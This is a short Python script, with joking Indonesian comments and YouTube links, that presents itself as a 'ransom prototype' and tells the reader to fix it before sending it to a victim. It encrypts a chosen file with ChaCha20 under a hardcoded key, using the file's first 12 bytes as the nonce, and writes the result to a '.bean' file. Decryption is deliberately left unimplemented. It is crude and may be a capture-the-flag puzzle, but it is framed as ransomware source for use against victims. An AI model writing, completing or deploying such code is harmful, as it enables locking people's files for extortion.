#ratata cha cha ratata
# another rans*m prototype (looking for investor)

# https://www.youtube.com/shorts/iHdktBgwE4M <- plis jangan buka
# to busy watching with mr bean edit ,
# plis fix it before sending to victim 
# 
# BUKAN SPOTIFY WRAPPED playlist
# https://www.youtube.com/watch?v=ni8RtUY5h50 <- asik juga wkwkwkw
# https://www.youtube.com/watch?v=88ldxMqlW7Q 
# https://www.youtube.com/watch?v=h9Uv8ZpbczM <- mmmmardial
# segitu dulu sob lanjut ngodingnya 

from Crypto.Cipher import ChaCha20
from Crypto.Random import get_random_bytes

class rrraansoom:
    key = bytes([15, 188, 195, 48, 183, 191, 111, 36, 240, 221, 172, 20, 60, 201, 58, 239, 91, 18, 205, 93, 70, 134, 155, 176, 76, 66, 248, 199, 123, 204, 68, 208])
    def encrypt(self, filename: str):
        try:
            with open(filename, 'rb') as f:
                plaintext = f.read()
                nonce = plaintext[:12]
            cipher = ChaCha20.new(key=self.key, nonce=nonce)
            ciphertext = cipher.encrypt(plaintext)
            with open(filename+'.bean', 'wb') as f:
                f.write(ciphertext)
                print('done')
        except:
            print("system errorrrrrrrrrrrr\naaaaaaaaa\ntelepon bomba cepat!!!")

    def decrypt(self, filename: str):
        print("aduhh rrruuusakkkk\ncepat telepon bomba!!!")
        pass

if __name__ == "__main__":
    while True:
        x = input('1. encrypt\n2. decrypt\n3. Exit\n>>> ')
        bean = rrraansoom()
        if x == '1':
            filename = input('welcome to mr bean r*ns*m prototype. Enter your filename: ')
            bean.encrypt(filename)
        elif x == '2':
            bean.decrypt('w')
        elif x == '3':
            exit()
        else:
            print("tak bisa yeee hahaha! keras nih bosssss, kasih keras muntun")
